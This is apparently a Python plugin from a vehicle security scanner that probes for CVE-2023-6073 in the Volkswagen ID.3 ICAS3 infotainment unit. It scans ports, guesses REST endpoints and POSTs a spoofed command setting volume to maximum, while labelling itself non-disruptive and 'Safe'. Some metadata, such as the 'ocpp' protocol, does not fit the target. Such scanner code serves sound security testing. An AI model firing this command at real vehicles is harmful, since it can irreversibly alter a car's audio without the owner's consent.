#!/usr/bin/env python3
"""Active validation PoC for connected-vehicle vulnerability scanning."""
from __future__ import annotations

import sys
import json
from pathlib import Path
sys.path.insert(0, str(Path(__file__).parent))
from probe_utils import HTTPProbe, detection_confidence, service_open

from active_validation_core import run_active_validation
from iv_plugin_base import IVIVulnerabilityPlugin


VULN = {
    "id": 51,
    "cve": "CVE-2023-6073",
    "year": 2023,
    "domain": "IVI/云端/EVSE/OS",
    "vendor_product": "Volkswagen ID.3 / ICAS3 IVI ECU",
    "component": "REST API",
    "type": "DoS/命令伪造",
    "summary": "可通过REST API使ICAS3 IVI ECU崩溃并伪造音量设置命令。",
    "source_description": "Attacker can perform a Denial of Service attack to crash the ICAS 3 IVI ECU in a Volkswagen ID.3 (and other vehicles of the VW Group with the same hardware) and spoof volume setting commands to irreversibly turn on audio volume to maximum via REST API calls.\n",
    "poc_status": "公开公告；大多未见一步式PoC",
    "research_value": "作为近两年前后演进基线，对比2024-2026风险变化。",
    "source_url": "https://nvd.nist.gov/vuln/detail/CVE-2023-6073",
    "references": [
        "https://nvd.nist.gov/vuln/detail/CVE-2023-6073",
        "https://asrg.io/cve-2023-6073-dos-and-control-of-volume-settings-for-vw-id-3-icas3-ivi-ecu/",
        "https://cveawg.mitre.org/api/cve/CVE-2023-6073"
    ],
    "affected": [
        {
            "vendor": "Volkswagen",
            "product": "ID.3",
            "versions": [
                {
                    "version": "0",
                    "status": "affected",
                    "lessThan": "3.2",
                    "versionType": "custom"
                }
            ]
        }
    ],
    "signature_tokens": [
        "CVE-2023-6073",
        "Volkswagen",
        "ID.3",
        "ICAS3",
        "IVI",
        "ECU",
        "REST",
        "API",
        "DoS",
        "perform",
        "Denial",
        "Service",
        "attack",
        "crash",
        "ICAS",
        "other",
        "Group",
        "same",
        "hardware",
        "spoof",
        "volume",
        "setting",
        "commands",
        "irreversibly",
        "turn",
        "audio",
        "maximum",
        "calls"
    ]
}



def _run_poc(plugin) -> dict:
    """Probe CVE-2023-6073: VW ID.3 ICAS3 REST API spoofed volume command injection."""
    params = plugin.params or {}
    target_ip = params.get("target_ip", getattr(plugin, "target_ip", "127.0.0.1"))
    port = int(params.get("port", 8080))
    tls = bool(params.get("tls", False))

    evidence = {
        "cve": "CVE-2023-6073",
        "target": f"{target_ip}:{port}",
        "technique": "HTTP behavioral probe - VW ID.3 ICAS3 REST API command spoofing (volume set to max)",
    }

    active_port = None
    for try_port in [port, 80, 443, 8080, 8443]:
        if service_open(target_ip, try_port):
            active_port = try_port
            tls = try_port in (443, 8443)
            break

    if active_port is None:
        evidence["service_open"] = False
        return {
            "vulnerable": None,
            "evidence": evidence,
            "detection_confidence": detection_confidence("E", evidence, "no_service"),
            "requires_manual_review": True,
        }

    evidence["service_open"] = True
    evidence["actual_port"] = active_port
    probe = HTTPProbe(target_ip, active_port, tls=tls, headers={"Accept": "application/json"})

    api_endpoints = ["/api/v1/volume", "/api/v1/media", "/api/v1/audio", "/rest/api/settings"]
    api_found = []
    for ep in api_endpoints:
        r = probe.get(ep)
        status = r.get("status")
        evidence[f"GET_{ep.strip('/').replace('/', '_')}_status"] = status
        if status == 200:
            api_found.append(ep)
            evidence["api_accessible"] = ep
            evidence["api_body_preview"] = r.get("body_text", "")[:200]

    if api_found:
        spoof_cmd = json.dumps({"volume": 100, "command": "set_volume_max"}).encode()
        r_cmd = probe.post(api_found[0], spoof_cmd, "application/json")
        evidence["command_spoof_status"] = r_cmd.get("status")
        evidence["command_spoof_response"] = r_cmd.get("body_text", "")[:200]
        if r_cmd.get("status") not in (401, 403, None):
            evidence["command_accepted"] = True
        return {
            "vulnerable": None,
            "evidence": evidence,
            "detection_confidence": detection_confidence("B", evidence, "rest_api_command_spoofed"),
            "requires_manual_review": True,
        }

    evidence["api_endpoints_tested"] = api_endpoints
    return {
        "vulnerable": None,
        "evidence": evidence,
        "detection_confidence": detection_confidence("C", evidence, "rest_api_probed"),
        "requires_manual_review": True,
    }

class Poc44CVE20236073DoSAuditPlugin(IVIVulnerabilityPlugin):
    meta_display_id = 'XLSX-051'
    meta_poc_name = 'CVE-2023-6073 命令伪造 Active Validation'
    meta_cve_id = 'CVE-2023-6073'
    meta_severity = 'Medium'
    meta_protocol = 'ocpp'
    meta_target_os = ['all']
    meta_required_params = ['service_banner']
    meta_profiles = ['network']
    meta_source_url = 'https://nvd.nist.gov/vuln/detail/CVE-2023-6073'
    meta_references       = ['https://nvd.nist.gov/vuln/detail/CVE-2023-6073']
    meta_attack_surface = '网络服务'
    is_disruptive = False
    meta_destructive_level = "Safe"

    def check_prerequisites(self):
        return True

    def exploit(self):
        return run_active_validation(self, VULN, probe=_run_poc)

if __name__ == "__main__":
    import argparse, json

    _desc = VULN.get("summary", "44_VW_ID3_REST_API_DoS_Command_Spoofing_Audit") if "VULN" in dir() else "44_VW_ID3_REST_API_DoS_Command_Spoofing_Audit"
    parser = argparse.ArgumentParser(description=_desc)
    parser.add_argument("target_ip", nargs="?", default="127.0.0.1",
                        help="目标 IP 地址")
    parser.add_argument("--port",       default=80, type=int)
    parser.add_argument("--disruptive", action="store_true",
                        help="启用破坏性探针（需操作员授权）")
    args = parser.parse_args()

    _plugin = Poc44CVE20236073DoSAuditPlugin({
        "target_ip":        args.target_ip,
        "port":             args.port,
        "allow_disruptive": args.disruptive,
    })
    _result = _plugin.run_verify()
    print(json.dumps(_result, indent=2, ensure_ascii=False, default=str))
